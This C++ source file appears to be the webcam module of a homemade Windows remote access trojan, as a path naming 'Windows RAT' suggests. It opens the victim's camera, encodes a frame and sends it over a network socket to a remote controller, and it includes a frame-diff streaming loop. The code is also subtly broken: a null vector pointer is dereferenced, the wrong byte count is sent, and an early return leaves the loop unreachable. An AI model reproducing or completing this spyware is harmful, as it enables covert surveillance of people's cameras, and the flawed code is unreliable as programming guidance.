//
// Created by avita on 15/09/2020.
//

#include "ShareCamera.h"
//#include <windows.h>

ShareCamera::ShareCamera(SOCKET sock) {
    socket = sock;
}



//Returning int32_t vector

vector<int32_t> *ShareCamera::compareFrames(Mat *frame_1, Mat *frame_2) {

    vector<int32_t> *changedBytes = {};
    changedBytes->push_back(htonl(frame_1->cols));
    changedBytes->push_back(htonl(frame_1->rows));

    for (int x = 0; x < frame_1->cols; x++) {
        for (int y = 0; y < frame_1->rows; y++) {
            size_t index = y * frame_1->cols * 3 + x * 3;
            if (frame_1->data[index + 0] != frame_2->data[index + 0] ||
                frame_1->data[index + 1] != frame_2->data[index + 1] ||
                frame_1->data[index + 2] != frame_2->data[index + 2]) {

                //The first element is the index of the pixels the third fourth and fifth elements are B.G.R
                //htonl is a network byte int
                changedBytes->push_back(htonl(index)); //Pushing the index of the frame
                changedBytes->push_back(htonl(frame_2->data[index + 0])); //B
                changedBytes->push_back(htonl(frame_2->data[index + 1])); //G
                changedBytes->push_back(htonl(frame_2->data[index + 2])); //R
                continue;
            }
        }
    }
    return changedBytes;
}

void ShareCamera::ShareCameraLive() {

    //Sending frame1 for the first time
    VideoCapture camera(0);
    vector<int32_t> *changedBytes = {};
    vector<uchar> imgTest = {};
    if (!camera.isOpened()) {       //If there is no a camera or cant open the camera
        send(socket, "Can't open the camera", sizeof("Can't open the camera"), 0);
        return;
    }

    camera >> frame1;
    cout << frame1.cols << endl;
    cout << frame1.rows << endl;

    imencode(".jpg", frame1, imgTest);
    send(socket, reinterpret_cast<const char *>(imgTest.data()), imgTest.size() * sizeof(uchar), 0);
    //send(socket, reinterpret_cast<const char *>(frame1.data), frame1.total() * frame1.elemSize(), 0);
    imwrite("C:\\Users\\avita\\PycharmProjects\\Windows RAT\\Original_Image.jpg", frame1);


    return;
    try {  //Comparing and sending frame1 and frame2
        while (true) {

            if (compare) {             //If compare is true so compareFrames will compare frame2 to frame1
                camera >> frame2;
                changedBytes = compareFrames(&frame2, &frame1);
                send(socket, reinterpret_cast<const char *>(changedBytes), sizeof(*changedBytes), 0);
            } else {                 //If compare is false so compareFrames will compare frame1 to frame2
                camera >> frame1;
                changedBytes = compareFrames(&frame1, &frame2);
                send(socket, reinterpret_cast<const char *>(changedBytes), sizeof(*changedBytes), 0);
            }
        }
    }
    catch (exception &e) {          //Catching any exception
        cout << e.what() << endl;
        cout << "Test Test Test Test Test Test Test Test" << endl;
    }
}